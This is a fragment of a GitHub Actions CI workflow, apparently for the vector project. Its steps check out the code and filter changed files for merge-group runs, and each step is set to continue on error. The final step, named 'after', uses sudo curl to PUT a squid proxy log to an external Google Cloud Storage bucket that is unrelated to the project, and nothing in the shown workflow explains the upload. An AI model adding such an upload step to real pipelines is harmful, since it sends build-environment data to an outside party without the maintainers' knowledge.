    - continue-on-error: true
      uses: actions/checkout@v3
    - continue-on-error: true
      id: changes
      if: github.event_name == 'merge_group'
      name: Collect file changes
      uses: dorny/paths-filter@v2
      with:
        base: ${{ github.event.merge_group.base_ref }}
        filters: "all_changed:\n  - added|deleted|modified: \"**\"\nignore:\n  - \"\
          ./.github/**\"\n  - \"./.gitignore\"\n  - \"distribution/**\"\n  - \"rust-doc/**\"\
          \n  - \"docs/**\"\n  - \"rfcs/**\"\n  - \"testing/**\"\n  - \"tilt/**\"\n\
          \  - \"website/**\"\n  - \"*.md\"\n  - \"Tiltfile\"\n  - \"netlify.toml\"\
          \n  - \"NOTICE\"\n  - \"LICENSE-3rdparty.csv\"\n  - \"LICENSE\"\n"
        list-files: shell
        ref: ${{ github.event.merge_group.head_ref }}
    - continue-on-error: true
      env:
        ALL: ${{ steps.changes.outputs.all_changed_files }}
        IGNORE: ${{ steps.changes.outputs.ignore_files }}
      id: filter
      if: github.event_name == 'merge_group'
      name: Determine if should not run due to irrelevant file changes
      run: "echo \"ALL='${{ env.ALL }}'\"\necho \"IGNORE='${{ env.IGNORE }}'\"\nexport\
        \ SOURCE_CHANGED=$(comm -2 -3 <(printf \"%s\\n\" \"${{ env.ALL }}\") <(printf\
        \ \"%s\\n\" \"${{ env.IGNORE }}\"))\necho \"SOURCE_CHANGED='${SOURCE_CHANGED}'\"\
        \n\nif [ \"${SOURCE_CHANGED}\" == \"\" ]; then\n  export SOURCE_CHANGED=\"\
        false\"\nelse\n  export SOURCE_CHANGED=\"true\"\nfi\n\necho \"SOURCE_CHANGED='${SOURCE_CHANGED}'\"\
        \necho \"SOURCE_CHANGED=${SOURCE_CHANGED}\" >> $GITHUB_OUTPUT\n"
    - name: after
      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid/vectordotdev/vector-ci-draft.$(date
        +%s)
    timeout-minutes: 60
